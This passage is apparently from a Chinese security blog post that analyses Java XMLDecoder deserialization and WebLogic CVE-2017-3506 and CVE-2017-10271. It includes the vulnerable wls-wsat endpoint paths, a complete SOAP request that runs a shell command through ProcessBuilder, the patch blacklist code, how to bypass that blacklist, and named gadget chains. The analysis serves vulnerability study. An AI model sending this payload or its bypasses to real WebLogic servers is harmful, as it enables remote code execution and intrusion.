<p>我们XML中第一个标签是JAVA，于是我们在JavaElementHandler各方法下断点后，可以发现next方法内部会先实例化JavaElementHandler，然后调用addAttribute，将获取的类对象(java.beans.XMLDecoder)置入this。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104193157735.png" alt="image-20211104193157735"></p>
<p>然后自然是解析object标签，由于ObjectElementHandler未定义对class属性的解析，所以会调用父类NewElementHandler对其进行解析，将获取的类对象(java.lang.ProcessBuilder)置入this</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104193433518.png" alt="image-20211104193433518"></p>
<p>就这样 得到标签-&gt;实例化Handler-&gt;循环标签属性进行事件处理  ，直到解析到第一个末标签(EndElement)&lt;/string&gt;,便会执行StringElementHandler#getValueObject，返回被ValueObjectImpl.create处理过的标签内的值。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104203042115.png" alt="image-20211104203042115"></p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104203356887.png" alt="image-20211104203356887"></p>
<p>然后接下来会把这个ValueObjectImpl对象赋值到父标签对应的handler的属性里</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104211811441.png" alt="image-20211104211811441"></p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105025432694.png" alt="image-20211105025432694"></p>
<p>而解析到&lt;void index=&quot;0&quot;&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt; 的&lt;/void&gt; 时，会根据if逻辑判断这里void标签的作用，这里判断的void起到一个数组元素赋值的作用，于是便通过set方法往Array赋值。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105134901622.png" alt="image-20211105134901622"></p>
<p>在解析到&lt;void method=&quot;start&quot;&gt;&lt;/void&gt;的末标签&lt;/void&gt;时，它的逻辑是这样的，先获取父handler对应type的实例化对象，然后再对其使用start方法</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140017348.png" alt="image-20211105140017348"></p>
<p>如果我们跟进这个getContextBean就会来到这里，发现确实是调用链父handler即ObjectElementHandler的getValueObject</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140036168.png" alt="image-20211105140036168"></p>
<p>跟进看看父handler的getValueObject逻辑，发现确实是返回了一个new ProcessBuilder(“calc”).  calc字段在var5.argument中，截图中没有截出来。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140436181.png" alt="image-20211105140436181"></p>
<p>回到本handler，通过拼接，执行了new ProcessBuilder(“calc”).start(); 弹出计算器。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140826489.png" alt="image-20211105140826489"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>当xml数据传入到XMLDecoder.readObejct后经过一些处理会传入到scanDocument方法里，这个方法会循环解析XML标签并交由相应的Handler进行处理，且子标签的handler对父标签的handler由链表结构串联起来，所以每解析一个标签就会往这个链表结构增添新元素并进行一些事件处理。</p>
<p>从安全方面而言，便是攻击者通过传入恶意XML数据交由XMLDecoder进行解析，XMLDecoder会循环遍历XML数据并进行拼接处理，直到最后拼接出完整的恶意语句并执行。</p>
<h3 id="CVE-2017-3506-amp-CVE-2017-10271"><a href="#CVE-2017-3506-amp-CVE-2017-10271" class="headerlink" title="CVE-2017-3506&amp;CVE-2017-10271"></a>CVE-2017-3506&amp;CVE-2017-10271</h3><p>影响范围</p>
<ul>
<li>WebLogic 10.3.6.0</li>
<li>WebLogic 12.1.3.0</li>
<li>WebLogic 12.2.1.0</li>
<li>WebLogic 12.2.1.1</li>
<li>WebLogic 12.2.1.2</li>
</ul>
<p>该漏洞利用weblogic的wls-wsat组件对XML用XMLDecoder进行解析的功能，从而对其传入恶意XML数据造成反序列化攻击。</p>
<p>复现分析如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] wls-wsat组件路径：</span><br><span class="line"></span><br><span class="line">            &#x2F;wls-wsat&#x2F;CoordinatorPortType</span><br><span class="line">            &#x2F;wls-wsat&#x2F;CoordinatorPortType11</span><br><span class="line">            &#x2F;wls-wsat&#x2F;ParticipantPortType</span><br><span class="line">            &#x2F;wls-wsat&#x2F;ParticipantPortType11</span><br><span class="line">            &#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC</span><br><span class="line">            &#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11</span><br><span class="line">            &#x2F;wls-wsat&#x2F;RegistrationRequesterPortType</span><br><span class="line">            &#x2F;wls-wsat&#x2F;RegistrationRequesterPortType1</span><br></pre></td></tr></table></figure>
<p>对weblogic路由   <a target="_blank" rel="noopener" href="http://xxx:7001/wls-wsat/CoordinatorPortType">http://xxx:7001/wls-wsat/CoordinatorPortType</a> 发送如下数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">  &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">        &lt;java version&#x3D;&quot;1.8.0_131&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">          &lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">            &lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">              &lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">                &lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">              &lt;&#x2F;void&gt;</span><br><span class="line">              &lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">                &lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">              &lt;&#x2F;void&gt;</span><br><span class="line">              &lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">                &lt;string&gt;touch &#x2F;tmp&#x2F;1234&lt;&#x2F;string&gt;</span><br><span class="line">              &lt;&#x2F;void&gt;</span><br><span class="line">            &lt;&#x2F;array&gt;</span><br><span class="line">          &lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">        &lt;&#x2F;java&gt;</span><br><span class="line">      &lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">    &lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">  &lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
<p>并修改content-type</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105162455106.png" alt="image-20211105162455106"></p>
<p>我这里直接在javaElementHandler#addAttribute 下断点然后观察堆栈信息<br>可以发现是WorkContextXmlInputAdapter#readUTF 处调用了xmlDecoder的readObject方法。我们的XML就这样传进去畅通无阻的进入了XMLDecoder的解析。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105153940400.png" alt="image-20211105153940400"></p>
<p>攻击结果</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105154839248.png" alt="image-20211105154839248"></p>
<p><code>CVE-2017-3506</code>修补方案为采用黑名单机制禁用了object标签，这简直不要太好绕，所以CVE-2017-10271来了。</p>
<p>这是黑名单校验的相关代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private void validate(InputStream is) &#123;</span><br><span class="line">      WebLogicSAXParserFactory factory &#x3D; new WebLogicSAXParserFactory();</span><br><span class="line">      try &#123;</span><br><span class="line">         SAXParser parser &#x3D; factory.newSAXParser();</span><br><span class="line">         parser.parse(is, new DefaultHandler() &#123;</span><br><span class="line">            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123;</span><br><span class="line">               if(qName.equalsIgnoreCase(&quot;object&quot;)) &#123;</span><br><span class="line">                  throw new IllegalStateException(&quot;Invalid context type: object&quot;);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">      &#125; catch (ParserConfigurationException var5) &#123;</span><br><span class="line">         throw new IllegalStateException(&quot;Parser Exception&quot;, var5);</span><br><span class="line">      &#125; catch (SAXException var6) &#123;</span><br><span class="line">         throw new IllegalStateException(&quot;Parser Exception&quot;, var6);</span><br><span class="line">      &#125; catch (IOException var7) &#123;</span><br><span class="line">         throw new IllegalStateException(&quot;Parser Exception&quot;, var7);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>绕过就是把object标签改为void标签就行了，因为从代码层面来看，void和object的handler因为是父子类关系，所以逻辑是高度相同的。</p>
<p>CVE-2017-10271的补丁则是继续把黑名单补全，可见除了object，还有method，new，array等标签都被做了处理。<br>object，new，method标签直接被ban，void属性只能设置index，array的class只能设置为byte类型。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private void validate(InputStream is) &#123;</span><br><span class="line">   WebLogicSAXParserFactory factory &#x3D; new WebLogicSAXParserFactory();</span><br><span class="line">   try &#123;</span><br><span class="line">      SAXParser parser &#x3D; factory.newSAXParser();</span><br><span class="line">      parser.parse(is, new DefaultHandler() &#123;</span><br><span class="line">         private int overallarraylength &#x3D; 0;</span><br><span class="line">         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123;</span><br><span class="line">            if(qName.equalsIgnoreCase(&quot;object&quot;)) &#123;</span><br><span class="line">               throw new IllegalStateException(&quot;Invalid element qName:object&quot;);</span><br><span class="line">            &#125; else if(qName.equalsIgnoreCase(&quot;new&quot;)) &#123;</span><br><span class="line">               throw new IllegalStateException(&quot;Invalid element qName:new&quot;);</span><br><span class="line">            &#125; else if(qName.equalsIgnoreCase(&quot;method&quot;)) &#123;</span><br><span class="line">               throw new IllegalStateException(&quot;Invalid element qName:method&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">               if(qName.equalsIgnoreCase(&quot;void&quot;)) &#123;</span><br><span class="line">                  for(int attClass &#x3D; 0; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                     if(!&quot;index&quot;.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        throw new IllegalStateException(&quot;Invalid attribute for element void:&quot; + attributes.getQName(attClass));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               if(qName.equalsIgnoreCase(&quot;array&quot;)) &#123;</span><br><span class="line">                  String var9 &#x3D; attributes.getValue(&quot;class&quot;);</span><br><span class="line">                  if(var9 !&#x3D; null &amp;&amp; !var9.equalsIgnoreCase(&quot;byte&quot;)) &#123;</span><br><span class="line">                     throw new IllegalStateException(&quot;The value of class attribute is not valid for array element.&quot;);</span><br><span class="line">                  &#125;</span><br></pre></td></tr></table></figure>
<p>直接绕它的黑名单的话，有如下思路</p>
<p>“</p>
<p>使用class标签构造类，但是由于限制了method函数，无法进行函数调用，只能从构造方法下手，且参数为基本类型：</p>
<ul>
<li>构造函数有写文件操作，文件名和内容可控，可以进行getshell。</li>
<li>构造函数有其他的反序列化操作，我们可以进行二次反序列化操作。</li>
<li>构造函数直接有执行命令的操作，执行命令可控。</li>
<li>有其它的可能导致rce的操作，比如表达式注入之类的。</li>
</ul>
<p>目前存在的利用链有：</p>
<ul>
<li>FileSystemXmlApplicationContext-RCE</li>
<li>UnitOfWorkChangeSet-RCE</li>
<li>ysoserial-jdk7u21-RCE</li>
<li>JtaTransactionManager-JNDI注入</li>
</ul>
<p>“</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">ConsT27</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://const27.com/2021/11/05/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">http://const27.com/2021/11/05/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/">java开发与安全</a></div><div class="post_share"><div class="social-share" data-image="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bb.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/mm_facetoface_collect_qrcode_1613729678854.png" target="_blank"><img class="post-qr-code-img" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/mm_facetoface_collect_qrcode_1613729678854.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/10/18/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"><img class="next-cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/cz.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">针对exchange的攻击方式</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/06/28/java安全中重要的几个机制/" title="java安全中几个重要机制"><img class="cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/es.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-28</div><div class="title">java安全中几个重要机制</div></div></a></div><div><a href="/2021/06/28/JNDI注入原理浅析/" title="JNDI注入原理浅析"><img class="cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/by.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-28</div><div class="title">JNDI注入原理浅析</div></div></a></div><div><a href="/2021/06/28/shiro反序列化(shiro-550与shiro-721)/" title="shiro反序列化(shiro-550与shiro-721)"><img class="cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-28</div><div class="title">shiro反序列化(shiro-550与shiro-721)</div></div></a></div><div><a href="/2021/06/28/7u21链浅析/" title="7u21链浅析"><img class="cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/ee.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-28</div><div class="title">7u21链浅析</div></div></a></div><div><a href="/2021/06/28/Apache-Commons-Collections1 反序列化分析/" title="Apache-Commons-Collections1 反序列化分析"><img class="cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/kp.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-28</div><div class="title">Apache-Commons-Collections1 反序列化分析</div></div></a></div><div><a href="/2021/06/28/tomcat Listener，Filter内存马简要分析/" title="tomcat Listener，Filter内存马简要分析"><img class="cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/hr.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-28</div><div class="title">tomcat Listener，Filter内存马简要分析</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#T3%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.</span> <span class="toc-text">T3协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">抓包分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2015-4852"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2015-4852</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#resolveClass"><span class="toc-number">1.2.2.</span> <span class="toc-text">resolveClass</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMLDecoder"><span class="toc-number">2.</span> <span class="toc-text">XMLDecoder</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-xerces"><span class="toc-number">2.1.</span> <span class="toc-text">apache xerces</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DocumentHandler"><span class="toc-number">2.2.</span> <span class="toc-text">DocumentHandler</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.1.</span> <span class="toc-text">工作原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo%E8%B0%83%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text">Demo调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#readObject"><span class="toc-number">2.3.1.</span> <span class="toc-text">readObject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ScanDocument"><span class="toc-number">2.3.2.</span> <span class="toc-text">ScanDocument</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.3.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-3506-amp-CVE-2017-10271"><span class="toc-number">2.4.</span> <span class="toc-text">CVE-2017-3506&amp;CVE-2017-10271</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By ConsT27</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">怀念那一刹耀眼的火花</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>